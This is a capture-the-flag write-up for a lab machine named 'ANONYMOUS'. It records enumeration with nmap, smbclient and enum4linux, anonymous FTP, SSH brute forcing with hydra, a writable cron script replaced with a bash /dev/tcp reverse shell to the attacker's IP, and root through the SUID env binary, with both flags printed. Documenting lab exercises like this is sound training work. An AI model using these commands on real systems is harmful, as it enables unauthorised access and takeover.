@@ -1,0 +1,642 @@
+ANONYMOUS.
+
+
+
+
+[>>> TASK 1: PWN]
+[1.1. ENUMERATE THE MACHINE. HOW MANY PORTS ARE OPEN?]
+[ACTION: quick nmap all ports scan]
+nmap -sS -T4 -sV -p- 10.10.19.116
+[OUTPUT]
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 11:43 CEST
+Nmap scan report for 10.10.19.116
+Host is up (0.040s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.0.8 or later
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[ANSWER]
+4
+
+
+
+[1.2. WHAT SERVICE IS RUNNING ON PORT 21?]
+[ANSWER (from last output)]
+ftp
+
+
+
+[1.3. WHAT SERVUCE IS RUNNING ON PORTS 139 AND 445?]
+[ANSWER (from last output)]
+smb
+
+
+
+[1.4. THERE'S A SHARE ON THE USER'S COMPUTER. WHAT'S IT CALLED?]
+[ACTION: simple share enumeration via smbclient]
+smbclient -L //10.10.19.116 -N
+[OUTPUT]
+Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	pics            Disk      My SMB Share Directory for Pics
+	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            ANONYMOUS
+[ANSWER]
+pics
+
+
+
+[1.5. user.txt]
+[NOTE]
+Looks like we need to achieve user access.
+First, we will explore the pics share, since all questions point towards it having a clue.
+[ACTION: connect to pics smb share as anon]
+smbclient //10.10.19.116/pics -N
+
+
+[ACTION: list all files in share]
+ls
+[OUTPUT]
+  .                                   D        0  Sun May 17 13:11:34 2020
+  ..                                  D        0  Thu May 14 03:59:10 2020
+  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
+  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020
+
+
+[ACTION: download all files (in current directory)]
+prompt OFF
+mget *
+
+
+[ACTION: view images downloaded]
+The images (puppos.jpeg, corgo2.jpg) don't appear to hold any useful info in plain sight.
+
+
+[NOTE]
+We will run some image inspection and steganography tools.
+[ACTION: run exiftool on images]
+No useful output.
+
+
+[ACTION: run binwalk on images]
+No useful output. 
+
+
+[ACTION: run steghide on images]
+No useful output running passswordless.
+
+
+[ACTION: run foremost on images]
+No useful output.
+
+
+[NOTE]
+It looks like there isn't anything hidden inside the images.
+Also, the other shares aren't useful.
+We will now explore the ftp service.
+[ACTION: anon connect to ftp]
+ftp 10.10.19.116
+[NOTE]
+To do an anon connection, credentials are: anonymous|anonymous.
+
+
+[ACTION: List content]
+ls
+[OUTPUT]
+229 Entering Extended Passive Mode (|||56285|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
+226 Directory send OK.
+
+
+[ACTION: Move into scripts and list content]
+cd scripts
+ls
+[OUTPUT]
+-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
+-rw-rw-r--    1 1000     1000         2666 Jul 25 10:17 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+226 Directory send OK.
+
+
+[ACTION: Disable prompting and download all files from current directory]
+prompt OFF
+mget *
+
+
+[ACTION: end session]
+exit
+
+
+[ACTION: read clean.sh]
+cat clean.sh
+[OUTPUT]
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+[NOTE]
+Script that deletes files from /tmp, and logs the deletions.
+
+
+[ACTION: read removed_files.log]
+cat removed_files.log
+[OUTPUT]
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+[NOTE]
+Nothing interesting.
+
+
+[ACTION: read to_do.txt]
+cat to_do.txt
+[OUTPUT]
+I need to disable the anonymous login...it's really not safe
+
+
+[ACTION: end ftp session]
+exit
+
+
+[NOTE]
+Looks like a dead end.
+[ACTION: enumerate smb users]
+enum4linux -a 10.10.19.116
+[OUTPUT]
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jul 25 12:31:33 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.19.116
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.19.116 )============================
+
+
+[+] Got domain/workgroup name: WORKGROUP
+
+
+ ================================( Nbtstat Information for 10.10.19.116 )================================
+
+Looking up status of 10.10.19.116
+	ANONYMOUS       <00> -         B <ACTIVE>  Workstation Service
+	ANONYMOUS       <03> -         B <ACTIVE>  Messenger Service
+	ANONYMOUS       <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ===================================( Session Check on 10.10.19.116 )===================================
+
+
+[+] Server 10.10.19.116 allows sessions using username '', password ''
+
+
+ ================================( Getting domain SID for 10.10.19.116 )================================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ===================================( OS information on 10.10.19.116 )===================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.10.19.116 from srvinfo: 
+	ANONYMOUS      Wk Sv PrQ Unx NT SNT anonymous server (Samba, Ubuntu)
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+
+
+ =======================================( Users on 10.10.19.116 )=======================================
+
+index: 0x1 RID: 0x3eb acb: 0x00000010 Account: namelessone	Name: namelessone	Desc: 
+
+user:[namelessone] rid:[0x3eb]
+
+ =================================( Share Enumeration on 10.10.19.116 )=================================
+
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	pics            Disk      My SMB Share Directory for Pics
+	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            ANONYMOUS
+
+[+] Attempting to map shares on 10.10.19.116
+
+//10.10.19.116/print$	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.19.116/pics	Mapping: OK Listing: OK Writing: N/A
+
+[E] Can't understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//10.10.19.116/IPC$	Mapping: N/A Listing: N/A Writing: N/A
+
+ ============================( Password Policy Information for 10.10.19.116 )============================
+
+
+
+[+] Attaching to 10.10.19.116 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+	[+] ANONYMOUS
+	[+] Builtin
+
+[+] Password Info for Domain: ANONYMOUS
+
+	[+] Minimum password length: 5
+	[+] Password history length: None
+	[+] Maximum password age: 37 days 6 hours 21 minutes 
+	[+] Password Complexity Flags: 000000
+
+		[+] Domain Refuse Password Change: 0
+		[+] Domain Password Store Cleartext: 0
+		[+] Domain Password Lockout Admins: 0
+		[+] Domain Password No Clear Change: 0
+		[+] Domain Password No Anon Change: 0
+		[+] Domain Password Complex: 0
+
+	[+] Minimum password age: None
+	[+] Reset Account Lockout Counter: 30 minutes 
+	[+] Locked Account Duration: 30 minutes 
+	[+] Account Lockout Threshold: None
+	[+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ =======================================( Groups on 10.10.19.116 )=======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ==================( Users on 10.10.19.116 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[I] Found new SID: 
+S-1-22-1
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[I] Found new SID: 
+S-1-5-32
+
+[+] Enumerating users using SID S-1-5-21-2144577014-3591677122-2188425437 and logon username '', password ''
+
+S-1-5-21-2144577014-3591677122-2188425437-501 ANONYMOUS\nobody (Local User)
+S-1-5-21-2144577014-3591677122-2188425437-513 ANONYMOUS\None (Domain Group)
+S-1-5-21-2144577014-3591677122-2188425437-1003 ANONYMOUS\namelessone (Local User)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\namelessone (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+ ===============================( Getting printer info for 10.10.19.116 )===============================
+
+No printers returned.
+
+
+enum4linux complete on Fri Jul 25 12:35:15 2025
+[NOTE: interesting output snippet]
+S-1-22-1-1000 Unix User\namelessone (Local User)
+
+
+[NOTE]
+We found a user with uid 1000. Same as the one displayed on the scripts folder.
+We will try to bruteforce his ssh login.
+[ACTION: bruteforce namelessone ssh]
+hydra -l namelessone -P ~/thm/rockyou.txt ssh://10.10.19.116
+
+
+[NOTE]
+Using rockyou is taking long, so I will try to create and run an optimized password list.
+First, we create base.txt with contents: anon, anonymous, namelessone.
+[ACTION: create passwordlist with john]
+john --wordlist=base.txt --rules --stdout > anonymous_list.txt
+
+
+[Attempt to bruteforce with custom list]
+hydra -l namelessone -P anonymous_list.txt ssh://10.10.19.116
+[OUTPUT]
+1 of 1 target completed, 0 valid password found
+
+
+[NOTE]
+After waiting a bit more, it looks like bruteforcing the ssh login isn't supposed to be the next step.
+Reading the writeup until now, I realize the clean.sh script is writeable.
+We can create a bash script (to spawn a shell) and upload it under the same name.
+[INFO: modified content of clean.sh]
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.23.25.109/4444 0>&1
+
+
+[ACTION: start listener]
+nc -lnvp 4444
+
+
+[ACTION: upload the script]
+ftp 10.10.19.116
+cd scripts
+put clean.sh
+[NOTE]
+It takes a little bit for the shell to appear.
+
+
+[ACTION: stabilize the shell]
+CTRL + Z
+stty raw -echo
+fg
+export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+[ACTION: list directory]
+ls
+[OUTPUT]
+pics  user.txt
+
+
+[ACTION: read user flag]
+cat user.txt
+[OUTPUT]
+90d6f992585815ff991e68748c414740
+
+
+
+[1.6. root.txt]
+[ACTION: check suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[OUTPUT]
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+/bin/umount
+/bin/fusermount
+/bin/ping
+/bin/mount
+/bin/su
+
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/pkexec
+[NOTE]
+None we can make use of.
+
+
+[ACTION: check kernel version]
+4.15.0-99-generic
+
+
+[NOTE]
+After some research, we find CVE-2018-18955 (https://www.exploit-db.com/exploits/47167). 
+We send the file via python server.
+[ACTION: attempt to run exploit]
+bash exploit.sh
+[OUTPUT]
+exploit.sh: line 26: $'\r': command not found
+exploit.sh: line 29: $'\r': command not found
+exploit.sh: line 30: syntax error near unexpected token `$'{\r''
+'xploit.sh: line 30: `command_exists() {
+
+
+[NOTE]
+We need to convert the file to linux endings.
+Then upload again and retry.
+[ACTION: fix end of lines]
+dos2unix 47167.sh
+
+
+[ACTION: Second attempt at CVE-2018-18955]
+bash exploitv2.sh
+[OUTPUT]
+[-] gcc is not installed
+[NOTE]
+Looks like we didn't verify all requirements.
+We could try to precompile on our machine, and then try to run the exploit with precompiled binaries.
+But we will search for other methods to privesc.
+
+
+[ACTION: check root cronjobs]
+cat /etc/crontab
+[OUTPUT]
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+[NOTE]
+Nothing useful
+
+
+
+[NOTE]
+We will try to find new privesc vectors with linpeas.
+[ACTION: run linpeas]
+chmod +x linpeas.sh; ./linpeas.sh | tee output.txt
+[NOTE]
+Nothing of use.
+
+
+[ACTION: check suid binaries (again)]
+find / -perm -4000 -type f -user root 2>/dev/null
+[OUTPUT]
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+/bin/umount
+/bin/fusermount
+/bin/ping
+/bin/mount
+/bin/su
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+
+[NOTE]
+Before, I skipped through env, which should work in our scenario.
+[ACTION: exploit env suid]
+/usr/bin/env /bin/sh -p
+[OUTPUT]
+#
+
+
+[ACTION: read root flag]
+cat /root/root.txt
+[OUTPUT]
+4d930091c31a622a7ed10f27999af363
+
